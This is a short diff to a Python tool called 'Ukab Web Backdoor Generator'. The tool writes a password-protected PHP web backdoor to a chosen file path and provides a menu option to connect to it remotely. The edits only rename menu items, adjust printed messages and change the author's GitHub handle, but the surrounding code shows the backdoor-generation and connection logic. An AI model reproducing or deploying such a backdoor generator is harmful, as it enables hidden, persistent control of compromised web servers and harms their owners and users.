@@ -16,8 +16,8 @@ print(
 '\x1b[1m','| Ukab Web Backdoor Generator (Uno)','\x1b[0m',
 '\n\x1b[1m','| Ǧmilu © 2017','\x1b[0m')
 print('''
- [1] Create Backdoor
- [2] Connect To Backdoor
+ [1] Create
+ [2] Connect
  [3] About
 ''')
 
@@ -26,7 +26,7 @@ def NewBackdoor():
     Name = input('[*] Choose Backdoor Name (ex : /home/user/bck.php) : ')
     Pass = input('[*] Choose Password : ')
     MD5password = hashlib.sha256(Pass.encode()).hexdigest()
-    print('[+] Crypt your password as SHA256,')
+    print('[+] Crypting your password as SHA256,')
     Backdoor_php = open(Name, 'w')
     BackdoorCode = """<?php
 $SHAPass = '"""+MD5password+"""';
@@ -69,11 +69,11 @@ def Connect():
     elif 'Wrong' in str(ImportURL):
         print('[-] Wrong Password. ')
     else:
-        print('[-] Somthing Wrong')
+        print('[!] Somthing Wrong')
 def About():
     print('\x1b[37m','''
 | Ukab (UNO) remote php_backdoor connector urllib based,
-| Github  : @timizart
+| Github  : @ddagmilu
                      ''','\x1b[0m')
 if MainChoose == '1':
     NewBackdoor()
